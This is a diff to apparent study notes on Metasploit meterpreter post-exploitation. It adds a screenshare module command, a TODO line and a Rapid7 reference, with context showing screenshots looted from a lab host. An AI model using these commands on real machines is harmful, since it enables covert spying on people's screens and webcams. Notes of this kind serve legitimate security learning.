@@ -2,6 +2,8 @@
 
 Search Tag(s): #metasploit-framework #command-and-control #interactive-shell
 
+TODO: Fill this info
+
 ## 6.1 - Webcam
 
 ### 6.1.1 - Help Menu
@@ -65,6 +67,8 @@ meterpreter > screenshare
 [*] Streaming...
 ```
 
+`meterpreter > run post/multi/manage/screenshare`
+
 3. `screen_spy` post exploitation module
 
 ```
@@ -124,3 +128,8 @@ host       service  type                  name              content    info     
 10.0.2.15           screenspy.screenshot  screenshot.4.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200141_default_10.0.2.15_screenspy.screen_723895.jpg
 10.0.2.15           screenspy.screenshot  screenshot.5.jpg  image/jpg  Screenshot  /root/.msf4/loot/20220515200153_default_10.0.2.15_screenspy.screen_495403.jpg
 ```
+
+---
+## References
+
+- [Rapid7: Metasploit Framework Screenshare Post Module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/multi/manage/screenshare.md)
